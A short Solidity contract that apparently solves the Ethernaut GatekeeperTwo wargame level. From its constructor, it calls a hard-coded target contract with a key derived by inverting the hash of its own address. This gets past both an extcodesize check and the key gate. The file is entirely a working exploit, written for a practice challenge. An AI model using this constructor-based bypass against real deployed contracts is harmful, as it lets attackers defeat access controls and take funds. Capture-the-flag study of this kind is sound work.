// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GateKeeperTwo.sol";

contract PenetrateAllGates{
    GatekeeperTwo g;

    constructor() {
        g= GatekeeperTwo(0x068c2d4D67b8dC9B74151CF0B68fE5755668c0ea);
        bytes8 gatekey=~bytes8(keccak256(abi.encodePacked(address(this))));
        g.enter(gatekey);
    }

}